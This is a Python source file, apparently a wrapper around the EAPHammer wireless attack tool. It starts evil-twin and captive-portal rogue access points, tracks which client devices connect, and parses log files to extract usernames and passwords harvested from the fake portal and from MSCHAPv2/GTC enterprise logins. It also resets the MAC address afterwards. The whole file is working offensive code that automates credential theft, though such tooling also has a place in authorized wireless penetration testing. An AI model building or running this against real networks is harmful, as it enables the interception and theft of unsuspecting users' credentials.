import os
import subprocess
import threading

class EAPHammer():
    def __init__(self, processPath):
        self.args = {}
        self.procPath = processPath
        self.process = None
        self.buffer = b''

        self.presets = {
            "eviltwin": {
                "creds": "!",
            },
            "troll": {
                "troll-defender": "!"
            },
            "evilportal": {
                "captive-portal": "!"
            },
        }

        pass

    def bootstrap(self):
        """
        bootstrap EAPHammer with certificates and other
        """
        subprocess.getoutput("{} --bootstrap".format(self.procPath))

    def setPreset(self, preset):
        """
        sets a preset from self.presets
        wip
        """
        self.args = self.presets[preset]

    def removeParam(self, key):
        """
        remove a specific argument

        Arguments:
            key: the key of the argument to remove
        """
        try:
            self.args.pop(key)
        except:
            pass

    def addParam(self, key, value="!"):
        """
        add an argument/parameter to the EAPHammer command

        Arguments:
            key: the argument
            value: the argument value, set to "!" to make it a flag (e.g. `--flag` instead of `--flag value`)
        """
        self.args[key] = value

    def clearParams(self):
        """
        clear all arguments
        """
        self.args = {}

    def compileArgs(self):
        a = [self.procPath]

        for k,v in self.args.items():
            a.append("--{}".format(k))

            if v != "!": # means is flag
                a.append('{}'.format(v))

        return a
    
    def run(self):
        """
        run EAPHammer process, returning `True` if successful, `False` otherwise
        """

        args = self.compileArgs()
        
        self.process = subprocess.Popen(args,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE
                                        )
        
        print("[+] Running \"{}\"".format(' '.join(args)))

        while True:
            r = self.process.stdout.read(1)
            self.buffer += r

            if b"Press enter to quit" in self.buffer:
                self.buffer = b'' # clear buffer
                if b"AP-DISABLED" in self.buffer: # AP wasn't started
                    print("[+] EAPHammer AP wasn't started")
                    return False 
                else: # AP was started
                    print("[+] EAPHammer AP started")
                    threading.Thread(target=self.__readThread__, daemon=True).start() # todo: use full read instead of this
                    return True
            
            
    def __readThread__(self):
        while True:
            try:
                r = self.process.stdout.read(-1)
            except ValueError:
                return
            
            self.buffer += r

    def stop(self):
        """
        stops the running EAPHammer process
        """

        while True:
            self.process.communicate(b"\r\n")
            try:
                self.process.wait(timeout=30)
                break
            except:
                print("[+] Timed out waiting for EAPhammer process to exit - trying again..")

        self.process = None

        print(subprocess.getoutput("sudo /bin/macchanger wlan0 -p"))

    def wait(self):
        """
        this is BLOCKING. waits for the command to finish. recommended to not use this
        """
        self.process.wait()

    def read(self):
        """
        read buffer
        """

        lines = self.buffer.decode('ascii').split("\n")

        # split connections by newlines, for easier parsing
        for line in lines:
            index = lines.index(line)

            if "CONNECTED" in line:
                lines.insert(index+1, "\n")

        return '\n'.join(lines).strip()
    
    def getConnections(self) -> dict:
        """
        read buffer, and decode connections into a dict
        """

        read = self.read()
        if len(read) == 0: return {}
        connections = read.split("\n\n")
        stations = {}

        for connection in connections: # for every connection
            lines = connection.split("\n")
            operations = [] # in chrono order
            macAddress = None
            interface = None

            for line in lines: # read line by line
                if "802.11" not in line: continue

                try:
                    interface, operation = line.split(" ", 1)
                except ValueError:
                    continue
                
                interface = interface[:-1]
                # extract the mac address from that operation, if we haven't found it already
                if macAddress == None:
                    words = operation.split(" ")
                    for word in words:
                        if ":" in word and len(word) == 17: # is mac address
                            macAddress = word
                        
                if "CONNECTED" in line: # "AP-STA-CONNECTED" prints different than all others, smh
                    operations.append("AP-STA-CONNECTED")
                else: # assume the operation is at the end of the line, after the last colon
                    _80211operation = operation.split(":")[-1].strip()

                    if _80211operation not in operations:
                        operations.append(_80211operation)


            stations[macAddress] = {"interface": interface, "operations": operations, "buffer": connection}

        return stations
    
    def CaptivePortalCredentials(self, skipEmpty=True):
        """
        returns credentials that were harvested from the evil portal
        """
        with open("/var/log/eaphammer/user.log", "r", encoding="utf-8") as f:
            data = f.read().split("\n") # CSV

        credentials = []
        for line in data:
            try:
                date, _, log, uuid, _, path, username, password, _, _ = line.split(",")
            except:
                print("err: \"{}\"".format(line))
                continue

            if (len(username) == 0 or len(password) == 0) and skipEmpty: continue

            credentials.append({
                "date": date,
                "user": uuid,
                "path": path,
                "username": username,
                "password": password
            })

        return credentials
    
    def HostapdCreds(self, file="/var/log/eaphammer/hostapd-eaphammer.log"):
        if not os.path.exists(file):
            return []
        
        with open(file, "r") as f:
            data = f.read()

        def parseBlock(data):
            data = data.strip()

            try:
                mtln, etc = data.split("\n", 1)
                method, time = mtln.split(":", 1)
            except:
                return {"method": None, "time": None, "username": None, "password": None}

            if method == "mschapv2":
                uname = etc.split("\n")[1].split(":", 1)[-1].strip()
                pword = etc.split("\n")[-1].split(":", 1)[-1].strip()
            elif method == "GTC":
                uname = etc.split("\n")[0].split(":", 1)[-1].strip()
                pword = etc.split("\n")[1].split(":", 1)[-1].strip()

            return {
                "method": method.strip(),
                "time": time.strip().split(" ", 1)[-1], # remove the day name from date, unneeded
                "username": uname.strip(),
                "password": pword.strip(),
            }


        split = data.split("\n\n\n")
        pws = []

        for x in split:
            if len(x.strip()) == 0:
                continue

            data = parseBlock(x)

            pws.append(data)

        return pws